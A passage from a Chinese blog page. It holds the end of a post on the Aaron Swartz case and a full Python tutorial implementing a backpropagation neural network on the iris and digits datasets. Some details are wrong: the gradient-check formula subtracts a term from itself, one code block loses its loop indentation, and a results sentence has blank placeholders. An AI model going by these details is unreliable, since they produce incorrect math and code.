<p>2013年5月13日，法院准予了房产律师们的部分行动，允许公开披露大量资产律师寻求解封的材料。但政府和MIT雇员的名字被替换。资产律师们认为姓名的披露胜过政府的利益和保护受害者远离潜在报复的可能。检察官和斯沃茨律师被勒令在2013年5月27日前协商披露和删节的条款。</p>
<p>凯文·鲍尔森(前黑客)于2013年11月提交了一个信息自由法案(FOIA)诉讼获取了130页来自美国特勤局有关斯沃茨的文件，美国特勤局有近20000页有关斯沃茨的文件。</p>
<p>关于海曼，BuzzFeed(一个社会新闻和娱乐网站)强调：“2008年，年轻黑客乔纳森·詹姆士在同一个检察官主导的联邦调查中自杀。”</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/machine-learning/2014/06/02/" itemprop="url">
                  实现一个反向传播人工神经网络
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-06-02T00:00:00+08:00" content="2014-06-02">
              2014-06-02
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/machine-learning/" itemprop="url" rel="index">
                    <span itemprop="name">machine learning</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/machine-learning/2014/06/02/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="machine-learning/2014/06/02//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h1 id="为何实现一个BP神经网络？">为何实现一个BP神经网络？</h1><blockquote>
<p>“What I cannot create, I do not understand”</p>
<p>— Richard Feynman,  February 1988</p>
</blockquote>
<hr>
<h2 id="实现一个BP神经网络的7个步骤">实现一个BP神经网络的7个步骤</h2><ol>
<li>选择神经网络 <em>结构</em></li>
<li><em>随机</em> 初始化权重</li>
<li>实现 <em>前向传播</em> </li>
<li>实现 <em>成本函数</em> $J(\Theta)$</li>
<li>实现反向传播算法并计算 <em>偏微分</em> $\frac{\partial}{\partial<br>\Theta_{jk}^{(i)}}J(\Theta)$</li>
<li>使用 <em>梯度检查</em> 并在检查后关闭</li>
<li>使用梯度下降或其它优化算法和反向传播来 <em>优化</em> $\Theta$ 的函数 $J(\Theta)$</li>
</ol>
<hr>
<h2 id="数据集">数据集</h2><p>我们选取著名的鸢尾花数据集作为神经网络作用的对象，首先先观察下数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">2</span>]:</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line"><span class="comment"># random it</span></span><br><span class="line">perm = np.random.permutation(iris.target.size)</span><br><span class="line">iris.data = iris.data[perm]</span><br><span class="line">iris.target = iris.target[perm]</span><br><span class="line"><span class="keyword">print</span> iris.data.shape</span><br><span class="line"><span class="keyword">print</span> iris.target.shape </span><br><span class="line">np.unique(iris.target)</span><br><span class="line"><span class="comment">#print iris</span></span><br><span class="line">Out[<span class="number">2</span>]:</span><br><span class="line">    (<span class="number">150</span>, <span class="number">4</span>)</span><br><span class="line">    (<span class="number">150</span>,)</span><br><span class="line"></span><br><span class="line">    array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>])</span><br></pre></td></tr></table></figure>
<p>可见，鸢尾花数据集有四个特征，分为三种类别，总共150个条数据。</p>
<hr>
<h1 id="选择人工神经网络结构">选择人工神经网络结构</h1><p><img src="/images/nn.png" alt="神经网络架构图"></p>
<hr>
<h1 id="随机初始化权重">随机初始化权重</h1><h2 id="网络权重随机初始化">网络权重随机初始化</h2><p> 初始化 $\Theta_{ij}^{(l)}$ 为  $[-\epsilon, \epsilon]$ 之间的随机值。</p>
<p> 初始化函数可定义如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">3</span>]:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_init</span><span class="params">(input_layer_size, hidden_layer_size, classes, init_epsilon=<span class="number">0.12</span>)</span>:</span></span><br><span class="line">    Theta_1 = np.random.rand(hidden_layer_size, input_layer_size + <span class="number">1</span>) * <span class="number">2</span> * init_epsilon -init_epsilon</span><br><span class="line">    Theta_2 = np.random.rand(classes, hidden_layer_size + <span class="number">1</span>) * <span class="number">2</span> * init_epsilon -init_epsilon</span><br><span class="line">    <span class="keyword">return</span> (Theta_1, Theta_2)</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="实现前向传播">实现前向传播</h1><p>每一层都以此为公式计算下一层：</p>
<p>$$<br>G_{\theta^{(l)}(X)} = \frac{1}{1 + e^{-X(\Theta^{(l)})^T}}<br>$$</p>
<p>注意添加偏差项。</p>
<hr>
<h3 id="前向传播函数定义如下">前向传播函数定义如下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">4</span>]:</span><br><span class="line"><span class="comment"># 先定义一个sigmoid函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(theta, X)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (<span class="number">1</span> + np.e ** (-np.dot(X, np.transpose(theta))))</span><br><span class="line"><span class="comment"># 前向传播函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(Theta_1, Theta_2, X)</span>:</span></span><br><span class="line">    h = g(Theta_1, np.hstack((np.ones((X.shape[<span class="number">0</span>], <span class="number">1</span>)), X)))</span><br><span class="line">    o = g(Theta_2, np.hstack((np.ones((h.shape[<span class="number">0</span>], <span class="number">1</span>)), h)))</span><br><span class="line">    <span class="keyword">return</span> o</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="实现成本函数">实现成本函数</h1><h2 id="成本函数的数学表示">成本函数的数学表示</h2><p>$$<br>J(\Theta) = -\frac{1}{m}[\sum<em>{i=1}^m<br>\sum</em>{k=1}^Ky<em>k^{(i)}\log(h</em>\Theta(x^{(i)}))_k + (1 -<br>y<em>k^{(i)})\log(1-h</em>\Theta(x^{(i)}))<em>k)] + \frac{\lambda}{2m}\sum</em>{l=1}^{L-1}\sum<br>_{i=1}^{s<em>l}\sum</em>{j=1}^{s<em>{l+1}}(\Theta</em>{ji}^{(l)})^2<br>$$</p>
<p>$K$是输出层单元个数, $L$是层数，我们这里是三， $s_l$ 是层 $l$ 中单元数。</p>
<hr>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">5</span>]:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">costfunction</span><span class="params">(nn_param, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span>:</span></span><br><span class="line">    Theta_1 = nn_param[:hidden_layer_size * (input_layer_size + <span class="number">1</span>)].reshape((hidden_layer_size, (input_layer_size + <span class="number">1</span>)))</span><br><span class="line">    Theta_2 = nn_param[hidden_layer_size * (input_layer_size + <span class="number">1</span>):].reshape((classes, (hidden_layer_size + <span class="number">1</span>)))</span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># recode y</span></span><br><span class="line">    y_recoded = np.eye(classes)[y,:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print y_recoded</span></span><br><span class="line">    <span class="comment"># calculate regularator</span></span><br><span class="line">    regularator = (np.sum(Theta_1**<span class="number">2</span>) + np.sum(Theta_2 ** <span class="number">2</span>)) * (lamb_da/(<span class="number">2</span>*m))</span><br><span class="line"></span><br><span class="line">    a3 = predict(Theta_1, Theta_2, X)</span><br><span class="line"></span><br><span class="line">    J = <span class="number">1.0</span> / m * np.sum(-<span class="number">1</span> * y_recoded * np.log(a3)-(<span class="number">1</span>-y_recoded) * np.log(<span class="number">1</span>-a3)) + regularator</span><br><span class="line">    <span class="comment"># print J</span></span><br><span class="line">    <span class="keyword">return</span> J</span><br></pre></td></tr></table></figure>
<p>因为scipy中优化函数要求输入参数是向量而不是矩阵，因此我们的函数实现也必须能够随时展开和复原矩阵。</p>
<hr>
<h1 id="实现反向传播">实现反向传播</h1><ul>
<li>正向传播计算网络输出</li>
<li>反向计算每一层的误差$\sigma^{(l)}$</li>
<li>由误差累加计算得到成本函数的偏微分$\frac{\partial}{\partial\Theta_{ij}^{(l)}}J(\Theta)$</li>
</ul>
<p>同样，在实现函数时因为要传递给<code>scipy.optimize</code>模块中的优化函数，必须能展开矩阵参数为向量并可随时复原。</p>
<p>详细实现过程参见Andrew NG在Coursera上的讲座。</p>
<p>数学推导过程请 <em>自行</em> 上coursera ml课程论坛搜索。</p>
<hr>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">6</span>]:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Gradient</span><span class="params">(nn_param, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span>:</span></span><br><span class="line">    </span><br><span class="line">    Theta_1 = nn_param[:hidden_layer_size * (input_layer_size + <span class="number">1</span>)].reshape((hidden_layer_size, (input_layer_size + <span class="number">1</span>)))</span><br><span class="line">    Theta_2 = nn_param[hidden_layer_size * (input_layer_size + <span class="number">1</span>):].reshape((classes, (hidden_layer_size + <span class="number">1</span>)))</span><br><span class="line">    </span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    Theta1_grad = np.zeros(Theta_1.shape);</span><br><span class="line">    Theta2_grad = np.zeros(Theta_2.shape);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="comment"># For the input layer, where l=1:</span></span><br><span class="line">        <span class="comment"># add a bias unit and forward propagate</span></span><br><span class="line">        a1 = np.hstack((np.ones((X[t:t+<span class="number">1</span>,:].shape[<span class="number">0</span>], <span class="number">1</span>)), X[t:t+<span class="number">1</span>,:]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># For the hidden layers, where l=2:</span></span><br><span class="line">        a2 = g(Theta_1, a1)</span><br><span class="line">        a2 = np.hstack((np.ones((a2.shape[<span class="number">0</span>], <span class="number">1</span>)), a2))</span><br><span class="line">        a3 = g(Theta_2, a2)</span><br><span class="line"></span><br><span class="line">        yy = np.zeros((<span class="number">1</span>, classes))</span><br><span class="line">        yy[<span class="number">0</span>][y[t]] = <span class="number">1</span></span><br><span class="line">        <span class="comment"># For the delta values:</span></span><br><span class="line">        delta_3 = a3 - yy;</span><br></pre></td></tr></table></figure>
<hr>
<p>续上页</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    delta_2 = delta_3.dot(Theta_2) * (a2 * (<span class="number">1</span> - a2))</span><br><span class="line">    delta_2 = delta_2[<span class="number">0</span>][<span class="number">1</span>:] <span class="comment"># Taking of the bias row</span></span><br><span class="line">    delta_2 = np.transpose(delta_2)</span><br><span class="line">    delta_2 = delta_2.reshape(<span class="number">1</span>, (np.size(delta_2)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># delta_1 is not calculated because we do not associate error with the input</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Big delta update</span></span><br><span class="line">    Theta1_grad = Theta1_grad + np.transpose(delta_2).dot(a1);</span><br><span class="line">    Theta2_grad = Theta2_grad + np.transpose(delta_3).dot(a2);</span><br><span class="line"></span><br><span class="line">Theta1_grad = <span class="number">1.0</span> / m * Theta1_grad + lamb_da / m * np.hstack((np.zeros((Theta_1.shape[<span class="number">0</span>], <span class="number">1</span>)), Theta_1[:, <span class="number">1</span>:]))</span><br><span class="line">Theta2_grad = <span class="number">1.0</span> / m * Theta2_grad + lamb_da / m * np.hstack((np.zeros((Theta_2.shape[<span class="number">0</span>], <span class="number">1</span>)), Theta_2[:, <span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">Grad = np.concatenate((Theta1_grad.ravel(), Theta2_grad.ravel()), axis=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> Grad</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="梯度检测">梯度检测</h1><blockquote>
<p>“But back prop as an algorithm has a lot of details and,you know, can be a<br>little bit tricky to implement.”</p>
<p>– Andrew NG如是说</p>
</blockquote>
<ul>
<li>即使看上去成本函数在一直减小，可能神经网络还是有问题。</li>
<li>梯度检测能让你确认，哦，我的实现还正常。</li>
</ul>
<hr>
<h2 id="梯度检测原理">梯度检测原理</h2><p>简单的微分近似。但相比反向传播神经网络算法计算量更大。</p>
<p>$$<br>\frac{\partial}{\partial\theta<em>{i}}J(\theta) \approx<br>\frac{J(\theta</em>{i}+\epsilon) - J(\theta_{i}+\epsilon) }{2\epsilon}<br>$$</p>
<h3 id="这种梯度计算实现如下：">这种梯度计算实现如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">7</span>]:</span><br><span class="line"><span class="comment"># define compute_grad</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_grad</span><span class="params">(theta, input_layer_size, hidden_layer_size, classes, X, y, lamb_da, epsilon=<span class="number">1e-4</span>)</span>:</span></span><br><span class="line">    n = np.size(theta)</span><br><span class="line">    gradaproxy = np.zeros(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        theta_plus = np.copy(theta) <span class="comment"># Important for in numpy assign is shalow copy</span></span><br><span class="line">        theta_plus[i] = theta_plus[i] + epsilon</span><br><span class="line">        theta_minus = np.copy(theta)</span><br><span class="line">        theta_minus[i] = theta_minus[i] - epsilon</span><br><span class="line">        gradaproxy[i] = (costfunction(theta_plus, input_layer_size, hidden_layer_size, classes, X, y, lamb_da) - costfunction(theta_minus, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)) / (<span class="number">2.0</span> * epsilon)</span><br><span class="line">    <span class="keyword">return</span> gradaproxy</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="把一切放到一起">把一切放到一起</h1><p>先定义训练函数如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">8</span>]:</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> optimize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span>:</span></span><br><span class="line">    Theta_1, Theta_2 = random_init(input_layer_size, hidden_layer_size, classes, init_epsilon=<span class="number">0.12</span>)</span><br><span class="line">    nn_param = np.concatenate((Theta_1.ravel(), Theta_2.ravel()))</span><br><span class="line">    final_nn = optimize.fmin_cg(costfunction, </span><br><span class="line">                                np.concatenate((Theta_1.ravel(), Theta_2.ravel()), axis=<span class="number">0</span>), </span><br><span class="line">                                fprime=Gradient, </span><br><span class="line">                                args=(input_layer_size,</span><br><span class="line">                                      hidden_layer_size, </span><br><span class="line">                                      classes, </span><br><span class="line">                                      X, </span><br><span class="line">                                      y,</span><br><span class="line">                                      lamb_da))</span><br><span class="line">    <span class="keyword">return</span> final_nn</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="使用训练集进行训练">使用训练集进行训练</h2><p>我选取鸢尾花数据集的100条作为训练集，剩下50条作为测试集。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">9</span>]:</span><br><span class="line">X = iris.data[:<span class="number">100</span>]</span><br><span class="line">y = iris.target[:<span class="number">100</span>]</span><br><span class="line">lamb_da = <span class="number">1.0</span> <span class="comment"># must be float</span></span><br><span class="line">input_layer_size = <span class="number">4</span></span><br><span class="line">hidden_layer_size = <span class="number">6</span></span><br><span class="line">classes = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">final_nn = train(input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line"></span><br><span class="line">    Warning: Desired error <span class="keyword">not</span> necessarily achieved due to precision loss.</span><br><span class="line">             Current function value: <span class="number">0.878999</span></span><br><span class="line">             Iterations: <span class="number">48</span></span><br><span class="line">             Function evaluations: <span class="number">152</span></span><br><span class="line">             Gradient evaluations: <span class="number">140</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="检测两种方式计算的梯度是否近似">检测两种方式计算的梯度是否近似</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">10</span>]:</span><br><span class="line"><span class="comment"># gradient checking</span></span><br><span class="line">grad_aprox = compute_grad(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line">grad_bp = Gradient(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line"><span class="keyword">print</span> (grad_aprox - grad_bp) &lt; <span class="number">1e-1</span></span><br><span class="line"></span><br><span class="line">    [ <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span></span><br><span class="line">      <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span></span><br><span class="line">      <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span></span><br><span class="line">      <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span></span><br><span class="line">      <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>]</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="对测试集使用训练得来的参数">对测试集使用训练得来的参数</h2><p>可以看到，测试集中50个样本有_个判定错误，其它_个分类正确。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">11</span>]:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span>:</span></span><br><span class="line">    Theta_1 = final_nn[:hidden_layer_size * (input_layer_size + <span class="number">1</span>)].reshape((hidden_layer_size, input_layer_size + <span class="number">1</span>))</span><br><span class="line">    Theta_2 = final_nn[hidden_layer_size * (input_layer_size + <span class="number">1</span>):].reshape((classes, hidden_layer_size + <span class="number">1</span>))</span><br><span class="line">    nsuccess = np.sum(np.argmax(predict(Theta_1, Theta_2, X), axis=<span class="number">1</span>) == y)</span><br><span class="line">    <span class="keyword">return</span> nsuccess</span><br><span class="line"></span><br><span class="line">n = test(final_nn, input_layer_size, hidden_layer_size, classes, iris.data[<span class="number">100</span>:], iris.target[<span class="number">100</span>:], lamb_da)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line">n = test(final_nn, input_layer_size, hidden_layer_size, classes, iris.data[:<span class="number">100</span>], iris.target[:<span class="number">100</span>], lamb_da)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"></span><br><span class="line">Out[<span class="number">11</span>]:</span><br><span class="line">    <span class="number">47</span></span><br><span class="line">    <span class="number">99</span></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="另一个例子：手写数字数据集">另一个例子：手写数字数据集</h1><p>最后是对同样著名的手写数字数据集的实验。</p>
<h3 id="载入并观察数据集：">载入并观察数据集：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">12</span>]:</span><br><span class="line">digits = datasets.load_digits()</span><br><span class="line"></span><br><span class="line"><span class="comment"># random it</span></span><br><span class="line">perm = np.random.permutation(digits.target.size)</span><br><span class="line">digits.data = digits.data[perm]</span><br><span class="line">digits.target = digits.target[perm]</span><br><span class="line"><span class="keyword">print</span> digits.data.shape</span><br><span class="line"><span class="keyword">print</span> digits.target.shape</span><br><span class="line"><span class="keyword">print</span> np.unique(digits.target)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">12</span>]:</span><br><span class="line">    (<span class="number">1797</span>, <span class="number">64</span>)</span><br><span class="line">    (<span class="number">1797</span>,)</span><br><span class="line">    [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="选择神经网络参数">选择神经网络参数</h2><p>取1000个样本作为训练集，剩下作为测试集。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">13</span>]:</span><br><span class="line">X = digits.data[:<span class="number">1000</span>]</span><br><span class="line">y = digits.target[:<span class="number">1000</span>]</span><br><span class="line">lamb_da = <span class="number">1.0</span> <span class="comment"># must be float</span></span><br><span class="line">input_layer_size = <span class="number">64</span></span><br><span class="line">hidden_layer_size = <span class="number">10</span></span><br><span class="line">classes = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">final_nn = train(input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">13</span>]:</span><br><span class="line">    Warning: Desired error <span class="keyword">not</span> necessarily achieved due to precision loss.</span><br><span class="line">             Current function value: <span class="number">0.594474</span></span><br><span class="line">             Iterations: <span class="number">965</span></span><br><span class="line">             Function evaluations: <span class="number">2210</span></span><br><span class="line">             Gradient evaluations: <span class="number">2189</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="进行梯度检测">进行梯度检测</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">14</span>]:</span><br><span class="line"><span class="comment"># gradient checking</span></span><br><span class="line">grad_aprox = compute_grad(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line">grad_bp = Gradient(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line"><span class="keyword">print</span> np.all((grad_aprox - grad_bp) &lt; <span class="number">1e-1</span>)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">14</span>]:</span><br><span class="line">    <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="对测试集使用训练得来的参数-1">对测试集使用训练得来的参数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">15</span>]:</span><br><span class="line"></span><br><span class="line">n = test(final_nn, input_layer_size, hidden_layer_size, classes, digits.data[<span class="number">1000</span>:], digits.target[<span class="number">1000</span>:], lamb_da)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"></span><br><span class="line">n = test(final_nn, input_layer_size, hidden_layer_size, classes, digits.data[:<span class="number">1000</span>], digits.target[:<span class="number">1000</span>], lamb_da)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"></span><br><span class="line">Out[<span class="number">15</span>]:</span><br><span class="line"></span><br><span class="line">    <span class="number">722</span></span><br><span class="line">    <span class="number">991</span></span><br></pre></td></tr></table></figure>
<hr>
<center><br><h3>BY REVERLAND</h3><br></center>



            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/sql/2014/05/31/mysql-learning-notes/" itemprop="url">
                  MySQL Learning Notes
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-31T00:00:00+08:00" content="2014-05-31">
              2014-05-31
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/sql/" itemprop="url" rel="index">
